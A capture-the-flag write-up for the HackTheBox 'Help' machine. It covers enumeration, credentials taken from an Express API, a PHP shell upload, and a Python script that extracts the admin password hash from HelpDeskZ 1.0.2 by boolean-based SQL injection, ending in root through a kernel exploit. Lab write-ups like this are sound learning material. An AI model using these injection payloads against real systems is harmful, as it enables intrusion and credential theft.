+++
title = 'Help'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan.

![Help (Easy Linux).png](Help%20%28Easy%20Linux%29.png)

Port 80 shows the default Apache page.

![Help (Easy Linux)-1.png](Help%20%28Easy%20Linux%29-1.png)

Port 3000 returns a JSON response - looks like some API.

![Help (Easy Linux)-2.png](Help%20%28Easy%20Linux%29-2.png)

Fuzzing finds `help.htb/support`:

![Help (Easy Linux)-3.png](Help%20%28Easy%20Linux%29-3.png)

Help Desk Z is open source - the repo is at https://github.com/helpdesk-z/helpdeskz-dev/blob/master/.htaccess. The version in the GitHub repo doesn't seem to have many vulnerabilities, but there are some for older versions. I couldn't determine the exact version running at `help.htb/support` at first.

Looking deeper at `help.htb:3000`:

![Help (Easy Linux)-4.png](Help%20%28Easy%20Linux%29-4.png)

The headers show something interesting - Express and an ETag. Googling Express: it's Express.js, a minimalist web framework for Node.js.

![Help (Easy Linux)-5.png](Help%20%28Easy%20Linux%29-5.png)

Needed a bit of help finding the right endpoint - it wasn't in the fuzz results.

Using the stack traces and the context of the original message telling "Shiv" that credentials can be queried:

![Help (Easy Linux)-6.png](Help%20%28Easy%20Linux%29-6.png)
![Help (Easy Linux)-8.png](Help%20%28Easy%20Linux%29-8.png)

`helpme@helpme.com`
`godhelpmeplz`

Entering the credentials into the website shows an error message.

![Help (Easy Linux)-9.png](Help%20%28Easy%20Linux%29-9.png)

Tried again and it worked - odd, moving on.

There's a file upload, and the vulnerability is somewhere in here.

The version of the software is 1.0.2. Based on the GitHub repo structure, there may be a README.md:

![Help (Easy Linux)-10.png](Help%20%28Easy%20Linux%29-10.png)

`http://help.htb/support/README.md` - there is indeed a README.md we can download.

That confirms the version is 1.0.2.

![Help (Easy Linux)-11.png](Help%20%28Easy%20Linux%29-11.png)
![Help (Easy Linux)-12.png](Help%20%28Easy%20Linux%29-12.png)

It seems you can upload `.php` even though we get an error page - the file does get uploaded. The filename is obfuscated but the exploit shows it's related to time.

So: upload a shell, then run the python script. That exploit didn't work for me (even though it did in Ippsec's video), so I looked at the SQL injection one instead.

The exploit script is broken, but following along we see we have to go to the attachment download link:

![Help (Easy Linux)-14.png](Help%20%28Easy%20Linux%29-14.png)

Adding `AND 1=1--` still gives us the file, but `AND 1=0--` doesn't:

![Help (Easy Linux)-15.png](Help%20%28Easy%20Linux%29-15.png)

So there's boolean-based SQL injection. Putting it into sqlmap succeeds and we can enumerate the database, tables, columns, etc. It's very slow - we can probably guess the "staff" table.

There's a username and password column:

![Help (Easy Linux)-16.png](Help%20%28Easy%20Linux%29-16.png)

"admin" is the username.

![Help (Easy Linux)-17.png](Help%20%28Easy%20Linux%29-17.png)

Options: write a script to enumerate the password, or fix the exploit script by putting in the correct endpoints. Tried fixing the exploit first - it's too broken.

```python
import requests

cookies = {
        "lang":"english",
        "PHPSESSID":"ffje9vbg4hlf1bbdfdie8s1044",
        "usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BH%2FjKDEz253n6ozUnIWcCOKmu9g60CEJ9QKffVBfX%2FmCQ%3D%3D"
        }

hash_characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']

password_hash = ""

for i in range(1,41): # SHA1 hash it seems? From HelpDeskZ 1.0.2 github
    for char in hash_characters:
        response = requests.get(f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=7&param[]=attachment&param[]=4&param[]=9+and+substr((select+(password)+from+staff+limit+0,1),{i},1)+%3d+'{char}'--", cookies=cookies)
        
        if "Page not found - 404" in str(response.content):
            continue
        else:
            password_hash += char
            print(f"Password hash: {password_hash}")
            break
```

Wrote the above to use the boolean-based injection to determine the password hash. It was taking ages - then I realised why the shell upload didn't work: I'd given the exploit the wrong base URL.

![Help (Easy Linux)-18.png](Help%20%28Easy%20Linux%29-18.png)

Dropped the hash method - too slow.

![Help (Easy Linux)-19.png](Help%20%28Easy%20Linux%29-19.png)

Basic enumeration:

![Help (Easy Linux)-21.png](Help%20%28Easy%20Linux%29-21.png)

This kernel is old and vulnerable - running the exploit https://www.exploit-db.com/exploits/44298 gives us root.

![Help (Easy Linux)-20.png](Help%20%28Easy%20Linux%29-20.png)
